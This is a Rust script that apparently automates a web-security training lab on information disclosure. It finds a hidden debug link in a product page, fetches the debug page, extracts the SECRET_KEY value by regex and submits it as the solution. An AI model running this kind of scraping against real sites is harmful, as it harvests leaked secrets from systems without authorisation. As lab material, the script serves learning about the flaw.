/****************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 2/9/2023
*
* Lab: Information disclosure on debug page
*
* Steps: 1. Check the source code of a product page
*        2. GET the href of the commented a tag named "Debug"
*        3. Extract the secret key
*        4. submit the solution
*
*****************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{collections::HashMap, time::Duration};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a1200d103534f548174d50c002c0076.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "⦗1⦘ Checking the source code..".white(),
        "OK".green()
    );

    // fetch a product page
    let product = client
        .get(format!("{url}/product?productId=4"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch a product page".red()));

    // get the body of the response
    let mut body = product.text().unwrap();

    // extract the debug path; change this if it is changed in your case
    let debug_path = capture_pattern("href=(.*)>Debug", &body)
        .expect(&format!("{}", "[!] Failed to extract the debug path".red()));

    println!(
        "{} {} => {}",
        "⦗2⦘ Extracting the debug path..".white(),
        "OK".green(),
        debug_path.yellow()
    );

    // fetch the debug page
    let debug_page = client
        .get(format!("{url}{debug_path}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the debug page".red()));

    println!(
        "{} {}",
        "⦗3⦘ Fetching the debug page..".white(),
        "OK".green()
    );

    // get the body of the debug page
    body = debug_page.text().unwrap();

    // extract the secret key
    let secret_key = capture_pattern("SECRET_KEY.*class=\"v\">(.*) <", &body)
        .expect(&format!("{}", "[!] Failed to extract the secret key".red()));

    println!(
        "{} {} => {}",
        "⦗4⦘ Extracting the secret key..".white(),
        "OK".green(),
        secret_key.yellow()
    );

    // submit the solution
    client
        .post(format!("{url}/submitSolution"))
        .form(&HashMap::from([("answer", secret_key)]))
        .send()
        .expect(&format!("{}", "[!] Failed to submit the solution".red()));

    println!(
        "{} {}",
        "⦗5⦘ Submitting the solution..".white(),
        "OK".green()
    );
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap().captures(text);
    if pattern.is_some() {
        Some(pattern.unwrap().get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
